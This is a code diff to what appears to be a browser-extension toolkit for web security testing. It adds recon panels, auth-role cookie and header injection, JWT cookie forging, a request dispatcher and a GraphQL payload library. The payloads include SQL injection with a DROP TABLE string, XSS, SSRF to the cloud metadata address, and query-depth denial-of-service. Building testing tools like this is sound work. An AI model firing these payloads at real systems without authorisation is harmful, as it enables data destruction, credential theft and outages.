+    wrap.innerHTML = `<div class="recon-section recon-placeholder" id="${def.id}">
+      <h4>${def.label}
+        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="${def.check}" title="Run">Run</button>
+        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
+      </h4>
+      <div class="recon-placeholder-msg muted">Not run</div>
+    </div>`;
+    const el = wrap.firstElementChild;
+    const newIdx = RECON_SECTION_ORDER.indexOf(def.id);
+    const sections = Array.from(output.querySelectorAll(':scope > .recon-section[id]'));
+    const ref = sections.find(s => RECON_SECTION_ORDER.indexOf(s.id) > newIdx);
+    if (ref) output.insertBefore(el, ref);
+    else output.appendChild(el);
+  }
+}
+
+const RECON_SECTION_ORDER = [
+  'recon-sec-tech', 'recon-sec-source', 'recon-sec-sourcemaps', 'recon-sec-links',
+  'recon-sec-robots', 'recon-sec-openredirect', 'recon-sec-header-audit', 'recon-sec-csp',
+  'recon-sec-forms', 'recon-sec-hidden', 'recon-sec-domxss', 'recon-sec-reflected',
+  'recon-sec-secrets', 'recon-sec-storage',
+];
+const RECON_RERUN_MAP = {
+  tech:         () => Recon.techStack(),
+  source:       () => Recon.sourceScan(),
+  sourcemaps:   () => Recon.sourceMaps(),
+  links:        () => Recon.links(),
+  robots:       () => Recon.robotsAndSitemap(),
+  openredirect: () => Recon.openRedirects(),
+  headers:      () => Recon.headerAudit(),
+  csp:          () => Recon.cspAnalysis(),
+  forms:        () => Recon.forms(),
+  hidden:       () => Recon.hiddenFields(),
+  domxss:       () => Recon.domXSS(),
+  reflected:    () => Recon.reflectedParams(),
+  secrets:      () => Recon.secrets(),
+  storage:      () => Recon.storageScan(),
 };
 
 function appendRecon(html) {
-  $('recon-output').insertAdjacentHTML('afterbegin', html);
+  const output = $('recon-output');
+  const wrap = document.createElement('div');
+  wrap.innerHTML = html.trim();
+  const newSection = wrap.firstElementChild;
+  if (!newSection) return;
+  const newId = newSection.id;
+
+  const existing = newId ? document.getElementById(newId) : null;
+  if (existing) {
+    existing.replaceWith(newSection);
+  } else {
+    const newIdx = RECON_SECTION_ORDER.indexOf(newId);
+    const sections = Array.from(output.querySelectorAll(':scope > .recon-section[id]'));
+    const ref = sections.find(s => RECON_SECTION_ORDER.indexOf(s.id) > newIdx);
+    if (ref) output.insertBefore(newSection, ref);
+    else output.appendChild(newSection);
+  }
+
   renderSummaryBar();
+  if (!Recon._runningAll) scrollContentToElement(newSection);
+}
+
+function scrollContentToElement(el, extraOffset = 8) {
+  const content = $('content');
+  if (!content || !el) return;
+  const activeBar = $('active-bar');
+  const stickyHeight = activeBar ? activeBar.offsetHeight : 0;
+  const contentTop = content.getBoundingClientRect().top;
+  const targetTop = el.getBoundingClientRect().top;
+  content.scrollTo({
+    top: content.scrollTop + targetTop - contentTop - stickyHeight - extraOffset,
+    behavior: 'smooth',
+  });
 }
 
 function renderSummaryBar() {
@@ -1406,7 +2132,7 @@ function sectionToMarkdown(section) {
   const title = h4
     ? Array.from(h4.childNodes)
         .filter(n => !(n.nodeType === Node.ELEMENT_NODE && n.tagName === 'BUTTON'))
-        .map(n => n.textContent).join('').replace(/⧉/g, '').trim()
+        .map(n => n.textContent).join('').trim()
     : (section.dataset.sectionName || '');
 
   const lines = [`## ${title}`, ''];
@@ -1471,13 +2197,15 @@ function sectionToMarkdown(section) {
     // ── Spider links ──
     const spiderLines = item.querySelectorAll('.recon-spider-line');
     if (spiderLines.length) {
-      const domain = item.querySelector('b')?.textContent.trim() || '';
+      const group = item.querySelector('b')?.textContent.trim() || '';
       const count  = item.querySelector(':scope > .muted')?.textContent.trim() || '';
-      if (domain) lines.push(`**${escMd(domain)}** ${escMd(count)}`.trim());
+      if (group) lines.push(`**${escMd(group)}** ${escMd(count)}`.trim());
       const seen = new Set();
       item.querySelectorAll('.recon-spider-line').forEach(l => {
-        const url = l.textContent.trim();
+        const url = l.dataset.url || l.querySelector('.recon-spider-url')?.textContent.trim() || '';
+        const loc = l.dataset.locations || '';
         if (!seen.has(url)) { seen.add(url); lines.push(`- ${escMd(url)}`); }
+        if (loc) lines.push(`  - Found in: ${escMd(loc)}`);
       });
       lines.push('');
       return;
@@ -1495,6 +2223,22 @@ function allReconToMarkdown() {
   const sections = Array.from($$('#recon-output .recon-section'));
   if (!sections.length) return '';
   return sections.map(sectionToMarkdown).join('\n\n---\n\n');
+}
+
+function reconToJson() {
+  const sections = Array.from($$('#recon-output .recon-section')).map(section => ({
+    name: section.dataset.sectionName || section.querySelector('h4')?.textContent.trim() || section.id,
+    severity: section.dataset.severity || 'info',
+    markdown: sectionToMarkdown(section),
+  }));
+  return {
+    url: state.tabUrl,
+    exportedAt: new Date().toISOString(),
+    active: {
+      roleId: state.activeRoleId,
+    },
+    sections,
+  };
 }
 
 // ─── Auth ─────────────────────────────────────────────────────────────────────
@@ -1586,7 +2330,7 @@ const Auth = {
         <span class="role-name">${esc(r.name)}</span>
         <span class="role-type">${esc(r.type)}</span>
         <span class="role-domain-label" title="Domain scope">${domainLabel}</span>
-        <button class="sm" data-action="edit-role" data-role-id="${r.id}" title="Edit" aria-label="Edit">✎</button>
+        <button class="sm" data-action="edit-role" data-role-id="${r.id}" title="Edit" aria-label="Edit">Edit</button>
         <button class="sm primary" data-action="apply-role" data-role-id="${r.id}">Apply</button>
         <button class="sm" data-action="eject-role">Eject</button>
         <button class="sm danger" data-action="del-role" data-role-id="${r.id}">Delete</button>
@@ -1608,16 +2352,16 @@ const Auth = {
       const { error } = await bg('REPLACE_NAMED_COOKIE', {
         forUrl: state.tabUrl,
         name: cname,
-        cookie: {
+        cookie: buildCookieSetDetails({
           url: `${scheme}://${cookieDomain}/`,
           name: cname,
           value: role.token,
           domain: cookieDomain,
           path: '/',
-        },
+        }),
       });
-      if (error) { toast(`Cookie error: ${error.message || error}`, 'error'); return; }
-      toast(`Cookie set for ${role.name} → ${cookieDomain}`, 'success');
+      if (error) { toast(`Cookie error: ${formatBgError(error)}`, 'error'); return; }
+      toast(`Cookie set for ${role.name} to ${cookieDomain}`, 'success');
     } else {
       const headerMap = { bearer: 'Authorization', basic: 'Authorization', custom: role.headerName };
       const headerName = headerMap[role.type] || 'Authorization';
@@ -1627,7 +2371,7 @@ const Auth = {
       const { error } = await bg('INJECT_AUTH', { headerName, token: tokenVal, domain });
       if (error) { toast(`Inject error: ${error}`, 'error'); return; }
       const scopeLabel = role.subdomains ? `${domain} + subdomains` : domain;
-      toast(`${role.name} applied — ${headerName} → ${scopeLabel}`, 'success');
+      toast(`${role.name} applied - ${headerName} to ${scopeLabel}`, 'success');
     }
     state.activeRoleId = id;
     await chrome.storage.local.set({ activeRoleId: id });
@@ -1689,7 +2433,7 @@ const HeaderProfiles = {
     row.innerHTML = `
       <input class="hprof-hname" placeholder="Header name (e.g. X-Forwarded-For)" value="${esc(name)}" autocomplete="off">
       <input class="hprof-hvalue" placeholder="Value" value="${esc(value)}" autocomplete="off">
-      <button class="sm danger hprof-remove" type="button" title="Remove">✕</button>`;
+      <button class="sm danger hprof-remove" type="button" title="Remove">Delete</button>`;
     row.querySelector('.hprof-remove').addEventListener('click', () => {
       row.remove();
       this._formRows.splice(idx, 1);
@@ -1726,13 +2470,13 @@ const HeaderProfiles = {
     if (!profile) return;
     const tabDomain = state.tabUrl ? new URL(state.tabUrl).hostname : '';
     const domain = profile.domain || tabDomain;
-    if (!domain) { toast('No domain — navigate to a page first', 'error'); return; }
+    if (!domain) { toast('No domain - navigate to a page first', 'error'); return; }
     const { error } = await bg('INJECT_HEADERS', { headers: profile.headers, domain });
     if (error) { toast(`Header inject error: ${error}`, 'error'); return; }
     this.activeId = id;
     await chrome.storage.local.set({ activeHeaderProfileId: id });
     bg('SYNC_ROLE_MENUS');
-    toast(`${profile.name} applied → ${domain}`, 'success');
+    toast(`${profile.name} applied to ${domain}`, 'success');
     this.renderProfiles();
     ActiveBar.update();
   },
@@ -1782,7 +2526,7 @@ const HeaderProfiles = {
           <span class="hpname">${esc(p.name)}</span>
           <span class="hpdetail" title="${esc(detail)}">${esc(truncated)} <span style="color:var(--yellow)">[${esc(domainLabel)}]</span></span>
           <button class="sm primary" data-action="hprof-apply" data-hpid="${p.id}">Apply</button>
-          <button class="sm danger" data-action="hprof-del" data-hpid="${p.id}" title="Delete">✕</button>
+          <button class="sm danger" data-action="hprof-del" data-hpid="${p.id}" title="Delete">Delete</button>
         </div>`;
     }).join('');
   },
@@ -1994,7 +2738,7 @@ const UserAgent = {
         <span class="uname">${esc(p.name)}</span>
         <span class="udetail" title="${esc(p.ua)}">${esc(p.ua)}</span>
         <button class="sm primary" data-action="ua-apply" data-uaid="${p.id}">Apply</button>
-        <button class="sm danger" data-action="ua-del" data-uaid="${p.id}" title="Delete" aria-label="Delete">✕</button>
+        <button class="sm danger" data-action="ua-del" data-uaid="${p.id}" title="Delete" aria-label="Delete">Delete</button>
       </div>
     `).join('');
   },
@@ -2132,7 +2876,7 @@ const Proxy = {
         <span class="pname">${esc(p.name)}</span>
         <span class="pdetail">${esc(p.scheme)}://${esc(p.host)}:${esc(p.port)}</span>
         <button class="sm primary" data-action="proxy-apply" data-pid="${p.id}">Apply</button>
-        <button class="sm danger" data-action="proxy-del" data-pid="${p.id}" title="Delete" aria-label="Delete">✕</button>
+        <button class="sm danger" data-action="proxy-del" data-pid="${p.id}" title="Delete" aria-label="Delete">Delete</button>
       </div>`
     ).join('');
   },
@@ -2146,24 +2890,24 @@ const Proxy = {
 
     if (this.activeMode === 'direct') {
       bar.className = 'proxy-status off';
-      icon.textContent = '○';
+      icon.className = 'status-dot off';
       text.textContent = 'Direct (no proxy)';
       $('proxy-direct').classList.add('active');
     } else if (this.activeMode === 'system') {
       bar.className = 'proxy-status on';
-      icon.textContent = '●';
+      icon.className = 'status-dot on';
       text.textContent = 'Using system proxy';
       $('proxy-system').classList.add('active');
     } else if (this.activeMode === 'profile') {
       const p = this.profiles.find(pr => pr.id === this.activeProfileId);
       bar.className = 'proxy-status on';
-      icon.textContent = '●';
-      text.textContent = p ? `${p.name} — ${p.scheme}://${p.host}:${p.port}` : 'Custom profile';
+      icon.className = 'status-dot on';
+      text.textContent = p ? `${p.name} - ${p.scheme}://${p.host}:${p.port}` : 'Custom profile';
     } else {
       const preset = PROXY_PRESETS[this.activeMode];
       bar.className = 'proxy-status on';
-      icon.textContent = '●';
-      text.textContent = `${this.activeMode} — ${preset.host}:${preset.port}`;
+      icon.className = 'status-dot on';
+      text.textContent = `${this.activeMode} - ${preset.host}:${preset.port}`;
       $(`proxy-${this.activeMode}`)?.classList.add('active');
     }
 
@@ -2221,6 +2965,313 @@ const Encode = {
     } catch (e) {
       return `[Error: ${e.message}]`;
     }
+  },
+};
+
+// ─── Timestamp ────────────────────────────────────────────────────────────────
+
+const Timestamp = {
+  parse(input) {
+    const s = input.trim();
+    if (!s) return null;
+    if (/^\d+$/.test(s)) {
+      const n = Number(s);
+      return new Date(s.length >= 12 ? n : n * 1000);
+    }
+    const d = new Date(s);
+    return isNaN(d) ? null : d;
+  },
+
+  render(d) {
+    const out = $('ts-output');
+    if (!d) {
+      out.innerHTML = '<div class="ts-error">Could not parse — try a Unix timestamp or ISO date string</div>';
+      return;
+    }
+    const unixS = Math.floor(d.getTime() / 1000);
+    const now = Date.now();
+    const diff = d.getTime() - now;
+    const abs = Math.abs(diff);
+    const rel = abs < 5000       ? 'just now'
+      : abs < 3600000  ? `${Math.round(abs / 60000)}m ${diff < 0 ? 'ago' : 'from now'}`
+      : abs < 86400000 ? `${Math.round(abs / 3600000)}h ${diff < 0 ? 'ago' : 'from now'}`
+      : `${Math.round(abs / 86400000)}d ${diff < 0 ? 'ago' : 'from now'}`;
+    const rows = [
+      ['Unix (s)',  String(unixS)],
+      ['Unix (ms)', String(d.getTime())],
+      ['ISO 8601',  d.toISOString()],
+      ['UTC',       d.toUTCString()],
+      ['Local',     d.toLocaleString()],
+      ['Relative',  rel],
+    ];
+    out.innerHTML = rows.map(([label, value]) =>
+      `<div class="ts-row">
+        <span class="ts-label">${esc(label)}</span>
+        <span class="ts-value">${esc(value)}</span>
+        <button class="sm ts-copy-btn" data-val="${esc(value)}" title="Copy">Copy</button>
+      </div>`
+    ).join('');
+  },
+};
+
+// ─── Diff ─────────────────────────────────────────────────────────────────────
+
+function diffLines(aLines, bLines) {
+  const m = aLines.length, n = bLines.length;
+  const dp = Array.from({ length: m + 1 }, () => new Array(n + 1).fill(0));
+  for (let i = m - 1; i >= 0; i--) {
+    for (let j = n - 1; j >= 0; j--) {
+      dp[i][j] = aLines[i] === bLines[j]
+        ? dp[i + 1][j + 1] + 1
+        : Math.max(dp[i + 1][j], dp[i][j + 1]);
+    }
+  }
+  const result = [];
+  let i = 0, j = 0;
+  while (i < m || j < n) {
+    if (i < m && j < n && aLines[i] === bLines[j]) {
+      result.push({ type: 'eq',  val: aLines[i] }); i++; j++;
+    } else if (i < m && (j >= n || dp[i + 1][j] >= dp[i][j + 1])) {
+      result.push({ type: 'del', val: aLines[i] }); i++;
+    } else {
+      result.push({ type: 'add', val: bLines[j] }); j++;
+    }
+  }
+  return result;
+}
+
+const Diff = {
+  run() {
+    const MAX = 500;
+    let a = $('diff-a').value;
+    let b = $('diff-b').value;
+    if ($('diff-json').checked) {
+      const pa = prettyJSON(a), pb = prettyJSON(b);
+      if (pa) a = pa;
+      if (pb) b = pb;
+    }
+    const aLines = a === '' ? [] : a.split('\n');
+    const bLines = b === '' ? [] : b.split('\n');
+    const statsEl = $('diff-stats');
+    const out = $('diff-output');
+
+    if (aLines.length > MAX || bLines.length > MAX) {
+      out.innerHTML = `<div class="diff-line eq">Input exceeds ${MAX}-line limit per side</div>`;
+      statsEl.classList.add('hidden');
+      return;
+    }
+
+    const result = diffLines(aLines, bLines);
+    let added = 0, removed = 0, lineA = 0, lineB = 0;
+    const html = result.map(d => {
+      let num, cls, sign;
+      if (d.type === 'eq')  { lineA++; lineB++; num = lineA; cls = 'eq';  sign = ' '; }
+      if (d.type === 'del') { lineA++;           num = lineA; cls = 'del'; sign = '-'; removed++; }
+      if (d.type === 'add') {           lineB++; num = lineB; cls = 'add'; sign = '+'; added++; }
+      return `<div class="diff-line ${cls}"><span class="diff-line-sign">${sign}</span><span class="diff-line-num">${num}</span><span>${esc(d.val)}</span></div>`;
+    }).join('');
+
+    out.innerHTML = html || '<div class="diff-line eq">(no input)</div>';
+    if (added || removed) {
+      statsEl.innerHTML = `<span class="diff-added">+${added} added</span>  <span class="diff-removed">-${removed} removed</span>`;
+    } else {
+      statsEl.innerHTML = 'Files are identical';
+    }
+    statsEl.classList.remove('hidden');
+  },
+
+  clear() {
+    $('diff-a').value = '';
+    $('diff-b').value = '';
+    $('diff-output').innerHTML = '';
+    $('diff-stats').classList.add('hidden');
+  },
+};
+
+// ─── Curl parser ──────────────────────────────────────────────────────────────
+
+function parseCurlCommand(raw) {
+  const s = raw.replace(/\\\r?\n\s*/g, ' ').trim();
+
+  function tokenize(str) {
+    const tokens = [];
+    let i = 0;
+    while (i < str.length) {
+      while (i < str.length && /[ \t]/.test(str[i])) i++;
+      if (i >= str.length) break;
+      let tok = '';
+      while (i < str.length && !/[ \t]/.test(str[i])) {
+        if (str[i] === "'") {
+          i++;
+          while (i < str.length) {
+            if (str.slice(i, i + 4) === "'\\''" ) { tok += "'"; i += 4; }
+            else if (str[i] === "'") { i++; break; }
+            else tok += str[i++];
+          }
+        } else if (str[i] === '"') {
+          i++;
+          while (i < str.length && str[i] !== '"') {
+            if (str[i] === '\\') { i++; tok += str[i++] || ''; }
+            else tok += str[i++];
+          }
+          if (i < str.length) i++;
+        } else if (str[i] === '\\') {
+          i++; tok += str[i++] || '';
+        } else {
+          tok += str[i++];
+        }
+      }
+      if (tok) tokens.push(tok);
+    }
+    return tokens;
+  }
+
+  const tokens = tokenize(s);
+  let method = null;
+  const headers = {};
+  let body = null;
+  let url = null;
+
+  const SKIP_VAL = new Set(['-u', '-o', '-F', '--limit-rate', '--max-time',
+    '--connect-timeout', '--cert', '--key', '--cacert', '-e', '--referer',
+    '--proxy', '-x', '--user', '--output', '--upload-file', '-T']);
+
+  let i = 0;
+  if (tokens[i] === 'curl') i++;
+
+  while (i < tokens.length) {
+    let t = tokens[i];
+    const eqIdx = t.startsWith('--') ? t.indexOf('=') : -1;
+    if (eqIdx > 2) {
+      tokens.splice(i + 1, 0, t.slice(eqIdx + 1));
+      t = t.slice(0, eqIdx);
+    }
+
+    if (t === '-X' || t === '--request') {
+      method = (tokens[++i] || '').toUpperCase();
+    } else if (t === '-H' || t === '--header') {
+      const hdr = tokens[++i] || '';
+      const c = hdr.indexOf(':');
+      if (c > 0) headers[hdr.slice(0, c).trim()] = hdr.slice(c + 1).trim();
+    } else if (t === '-d' || t === '--data' || t === '--data-raw' || t === '--data-binary') {
+      body = tokens[++i] || '';
+    } else if (SKIP_VAL.has(t)) {
+      i++;
+    } else if (!t.startsWith('-') && !url) {
+      url = t;
+    }
+    i++;
+  }
+
+  if (!method) method = body ? 'POST' : 'GET';
+  return { method, url, headers, body };
+}
+
+// ─── Dispatch ─────────────────────────────────────────────────────────────────
+
+const Dispatch = {
+  loadCurrent() {
+    const url = state.tabUrl || '';
+    if (isHttpUrl(url)) $('dispatch-url').value = url;
+    else toast('Navigate to a real http/https page first', 'warn');
+  },
+
+  parseHeaders(raw) {
+    const text = String(raw || '').trim();
+    if (!text) return {};
+    if (text.startsWith('{')) {
+      const parsed = JSON.parse(text);
+      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) throw new Error('Headers must use Name: value format');
+      return parsed;
+    }
+    const headers = {};
+    text.split(/\r?\n/).forEach((line, idx) => {
+      const trimmed = line.trim();
+      if (!trimmed || trimmed.startsWith('#')) return;
+      const colon = trimmed.indexOf(':');
+      if (colon <= 0) throw new Error(`Invalid header on line ${idx + 1}`);
+      const name = trimmed.slice(0, colon).trim();
+      const value = trimmed.slice(colon + 1).trim();
+      if (!name) throw new Error(`Invalid header on line ${idx + 1}`);
+      headers[name] = value;
+    });
+    return headers;
+  },
+
+  appendParamValue(value) {
+    const current = $('dispatch-url').value.trim() || state.tabUrl;
+    if (!isHttpUrl(current)) { toast('Set a URL first', 'error'); activateTab('dispatch'); return; }
+    try {
+      const url = new URL(current);
+      const key = url.searchParams.has('q') ? 'payload' : 'q';
+      url.searchParams.set(key, value);
+      $('dispatch-url').value = url.href;
+      activateTab('dispatch');
+      toast('Payload added to URL', 'success');
+    } catch (e) {
+      toast(String(e), 'error');
+    }
+  },
+
+  buildCurl() {
+    const method = $('dispatch-method').value;
+    const url = $('dispatch-url').value.trim();
+    let headers = {};
+    try { headers = this.parseHeaders($('dispatch-headers').value); } catch {}
+    const body = $('dispatch-body').value;
+    const q = s => `'${String(s).replace(/'/g, "'\\''")}'`;
+    const parts = ['curl', '-i', '-X', q(method), q(url)];
+    Object.entries(headers).forEach(([k, v]) => parts.push('-H', q(`${k}: ${v}`)));
+    if (body && method !== 'GET' && method !== 'HEAD') parts.push('--data-raw', q(body));
+    return parts.join(' ');
+  },
+
+  statusClass(code) {
+    if (!code) return '';
+    if (code < 300) return 'ok';
+    if (code < 400) return 'redir';
+    if (code < 500) return 'client';
+    return 'server';
+  },
+
+  async send() {
+    const method = $('dispatch-method').value;
+    const url = $('dispatch-url').value.trim();
+    if (!isHttpUrl(url)) { toast('Valid http/https URL required', 'error'); return; }
+    let headers = {};
+    try { headers = this.parseHeaders($('dispatch-headers').value); }
+    catch (e) { toast(e.message || 'Headers must use Name: value format', 'error'); return; }
+    const body = $('dispatch-body').value;
+    const btn = $('dispatch-send');
+    btn.disabled = true;
+    btn.textContent = 'Sending…';
+    const resp = await bg('FETCH', { url, method, headers, body, maxBody: 200000 }).catch(e => ({ error: String(e) }));
+    btn.disabled = false;
+    btn.textContent = 'Send';
+    if (resp.error) { toast(`Request failed: ${resp.error}`, 'error'); return; }
+    const badge = $('dispatch-status-badge');
+    badge.textContent = `${resp.status} ${resp.statusText || ''}  •  ${resp.length} bytes`;
+    badge.className = `dispatch-status-badge ${this.statusClass(resp.status)}`;
+    badge.classList.remove('hidden');
+    const headersText = Object.entries(resp.headers || {}).map(([k, v]) => `${k}: ${v}`).join('\n');
+    const responseEl = $('dispatch-response');
+    responseEl.classList.remove('muted');
+    responseEl.innerHTML = headersText
+      ? `<span class="dim">${esc(headersText)}</span>\n\n${esc(resp.body || '')}`
+      : esc(resp.body || '');
+  },
+
+  clear() {
+    $('dispatch-method').value = 'GET';
+    $('dispatch-url').value = '';
+    $('dispatch-headers').value = '';
+    $('dispatch-body').value = '';
+    const responseEl = $('dispatch-response');
+    responseEl.classList.add('muted');
+    responseEl.textContent = 'No response yet';
+    const badge = $('dispatch-status-badge');
+    badge.textContent = '';
+    badge.classList.add('hidden');
   },
 };
 
@@ -2388,13 +3439,11 @@ async function jwtSendToCookie() {
   if (!token) { toast('Forge token first', 'error'); return; }
   const c = state.jwtSourceCookie;
   if (!c) { toast('No source cookie', 'error'); return; }
-  const scheme = (c.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
-  const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
-  const url    = `${scheme}://${host}${c.path}`;
-  const cookie = { url, name: c.name, value: token, domain: c.domain, path: c.path, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite };
-  if (c.expirationDate) cookie.expirationDate = c.expirationDate;
+  const cookie = buildCookieSetDetailsFromExisting(c, { value: token });
   const { error } = await bg('SET_COOKIE', { cookie });
-  if (error) { toast(`Error: ${error.message}`, 'error'); return; }
+  if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
+  state.jwtSourceCookie = { ...c, value: token };
+  await Cookies.reloadAfterMutation();
   toast(`Cookie "${c.name}" updated`, 'success');
 }
 
@@ -2522,33 +3571,272 @@ const PAYLOAD_CATS = [
     'http://0177.0.0.1/',
     'http://0x7f.0x0.0x0.0x1/',
   ]},
+  { cat: 'GraphQL', payloads: [
+    // Introspection
+    '{"query":"{__schema{types{name}}}"}',
+    '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{name kind}}}"}',
+    '{"query":"{__type(name:\"Query\"){fields{name}}}"}',
+    '{"operationName":"IntrospectionQuery","query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}}}","variables":{}}',
+    '{"query":"\\n{__schema{types{name kind}}}"}',
+    '{"query":"query IntrospectionQuery{schema:__schema{types{name kind}}}"}',
+    '{"query":"query IntrospectionQuery{__schema{directives{name locations args{name type{name kind}}}}}"}',
+    '{"query":"fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name}}}query IntrospectionQuery{__schema{types{name kind fields(includeDeprecated:true){name type{...TypeRef}}}}}"}',
+    '{"query":"query IntrospectionQuery{\\u005f\\u005fschema{queryType{name}types{name kind}}}"}',
+    // Auth bypass
+    '{"query":"{__typename}"}',
+    '{"query":"mutation{__typename}"}',
+    // Field suggestion probing
+    '{"query":"{users{id email password}}"}',
+    '{"query":"{user(id:1){id email role password token}}"}',
+    '{"query":"{me{id email role token apiKey}}"}',
+    // Batching
+    '[{"query":"{__typename}"},{"query":"{__typename}"}]',
+    // Injection via argument
+    '{"query":"{user(id:\"1 OR 1=1\"){id email}}"}',
+    '{"query":"{user(id:\"1; DROP TABLE users;--\"){id}}"}',
+    '{"query":"{search(q:\"<script>alert(1)</script>\"){results}}"}',
+    // SSRF via query
+    '{"query":"{import(url:\"http://169.254.169.254/latest/meta-data/\")}"}',
+    // Depth/complexity DoS
+    '{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}"}',
+    // Alias overload
+    '{"query":"{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename}"}',
+    // Fragment cycle
+    '{"query":"fragment f on Query{...f}{...f}"}',
+    // Variables exfil
+    '{"query":"query($id:ID!){user(id:$id){id email password role}}","variables":{"id":"1"}}',
+  ]},
+  { cat: 'GraphQL (GET)', payloads: [
+    // Introspection
+    '?query=%7B__schema%7Btypes%7Bname%7D%7D%7D',
+    '?query=query+IntrospectionQuery%7B__schema%7BqueryType%7Bname%7DmutationType%7Bname%7Dtypes%7Bname+kind%7D%7D%7D',
+    '?query=%7B__type(name%3A%22Query%22)%7Bfields%7Bname%7D%7D%7D',
+    '?operationName=IntrospectionQuery&query=query+IntrospectionQuery%7B__schema%7BqueryType%7Bname%7DmutationType%7Bname%7DsubscriptionType%7Bname%7D%7D%7D&variables=%7B%7D',
+    '?query=%0A%7B__schema%7Btypes%7Bname+kind%7D%7D%7D',
+    '?query=query+IntrospectionQuery%7Bschema%3A__schema%7Btypes%7Bname+kind%7D%7D%7D',
+    '?query=query+IntrospectionQuery%7B__schema%7Bdirectives%7Bname+locations+args%7Bname+type%7Bname+kind%7D%7D%7D%7D%7D',
+    // Auth bypass
+    '?query=%7B__typename%7D',
+    '?query=mutation%7B__typename%7D',
+    // Field suggestion probing
+    '?query=%7Busers%7Bid+email+password%7D%7D',
+    '?query=%7Buser(id%3A1)%7Bid+email+role+password+token%7D%7D',
+    '?query=%7Bme%7Bid+email+role+token+apiKey%7D%7D',
+    // Injection via argument
+    '?query=%7Buser(id%3A%221+OR+1%3D1%22)%7Bid+email%7D%7D',
+    '?query=%7Bsearch(q%3A%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22)%7Bresults%7D%7D',
+    // SSRF
+    '?query=%7Bimport(url%3A%22http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%22)%7D',
+    // Depth DoS
+    '?query=%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7B__typename%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D',
+    // Alias overload
+    '?query=%7Ba%3A__typename+b%3A__typename+c%3A__typename+d%3A__typename+e%3A__typename+f%3A__typename%7D',
+    // Newline bypass
+    '?query=%0A%7B__schema%7Btypes%7Bname%7D%7D%7D',
+    // operationName bypass
+    '?operationName=IntrospectionQuery&query=query+IntrospectionQuery+%7B__schema%7BqueryType%7Bname%7D%7D%7D',
+  ]},
 ];
 
 const Payloads = {
   filter: '',
+
+  allCats() {
+    const builtIns = PAYLOAD_CATS.filter(c => c.cat !== 'GraphQL (GET)');
+    const builtInNames = new Set(builtIns.map(c => c.cat));
+    const merged = builtIns.map(c => {
+      const customPayloads = state.customPayloadCats
+        .filter(g => g.cat === c.cat || (c.cat === 'GraphQL' && g.cat === 'GraphQL (GET)'))
+        .flatMap(g => g.payloads || []);
+      return { ...c, custom: false, customPayloads };
+    });
+    state.customPayloadCats
+      .filter(c => !builtInNames.has(c.cat) && c.cat !== 'GraphQL (GET)')
+      .forEach(c => merged.push({ ...c, payloads: [], custom: true, customPayloads: c.payloads || [] }));
+    return merged;
+  },
+
+  graphQLPayloadMethod() {
+    return state.payloadGraphQLMethod === 'GET' ? 'GET' : 'POST';
+  },
+
+  toGraphQLGetPayload(value) {
+    if (String(value).startsWith('?')) return value;
+    try {
+      const parsed = JSON.parse(value);
+      if (Array.isArray(parsed)) return '?query=' + encodeURIComponent(value);
+      const params = new URLSearchParams();
+      if (parsed.operationName) params.set('operationName', parsed.operationName);
+      if (parsed.query) params.set('query', parsed.query);
+      if (parsed.variables) params.set('variables', JSON.stringify(parsed.variables));
+      if (parsed.extensions) params.set('extensions', JSON.stringify(parsed.extensions));
+      if ([...params.keys()].length) return '?' + params.toString();
+    } catch {}
+    return '?query=' + encodeURIComponent(value);
+  },
+
+  displayValue(cat, value) {
+    if (cat !== 'GraphQL' || this.graphQLPayloadMethod() !== 'GET') return value;
+    return this.toGraphQLGetPayload(value);
+  },
+
+  async loadCustom() {
+    const { customPayloadCats = [], payloadGroupOrders = {} } = await chrome.storage.local.get(['customPayloadCats', 'payloadGroupOrders']);
+    state.customPayloadCats = customPayloadCats;
+    state.payloadGroupOrders = payloadGroupOrders;
+    this.renderCustomList();
+  },
+
+  async saveCustom() {
+    const name = $('payload-custom-name').value.trim();
+    const payloads = $('payload-custom-values').value.split('\n').map(s => s.trim()).filter(Boolean);
+    if (!name || !payloads.length) { toast('Group name and payloads required', 'error'); return; }
+    const existing = state.customPayloadCats.findIndex(c => c.cat === name);
+    if (existing >= 0) state.customPayloadCats[existing] = { ...state.customPayloadCats[existing], payloads };
+    else state.customPayloadCats.push({ id: Date.now(), cat: name, payloads });
+    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats });
+    $('payload-custom-name').value = '';
+    $('payload-custom-values').value = '';
+    this.renderCustomList();
+    this.render();
+    toast('Payload group saved', 'success');
+  },
+
+  async deleteCustom(id) {
+    state.customPayloadCats = state.customPayloadCats.filter(c => c.id !== id);
+    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats });
+    this.renderCustomList();
+    this.render();
+    toast('Payload group deleted', 'success');
+  },
+
+  async addToGroup(cat, payload) {
+    const value = payload.trim();
+    if (!value) { toast('Payload required', 'error'); return; }
+    const groupDef = this.allCats().find(c => c.cat === cat);
+    const existingValues = groupDef ? [...(groupDef.payloads || []), ...(groupDef.customPayloads || [])] : [];
+    if (existingValues.includes(value)) { toast('Payload already exists', 'warn'); return; }
+    let group = state.customPayloadCats.find(c => c.cat === cat);
+    if (!group) {
+      group = { id: Date.now(), cat, payloads: [] };
+      state.customPayloadCats.push(group);
+    }
+    group.payloads.push(value);
+    state.payloadGroupOrders[cat] = [...this.orderedRows(cat, existingValues.map(v => ({ value: v }))).map(r => r.value), value];
+    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats, payloadGroupOrders: state.payloadGroupOrders });
+    this.renderCustomList();
+    this.render();
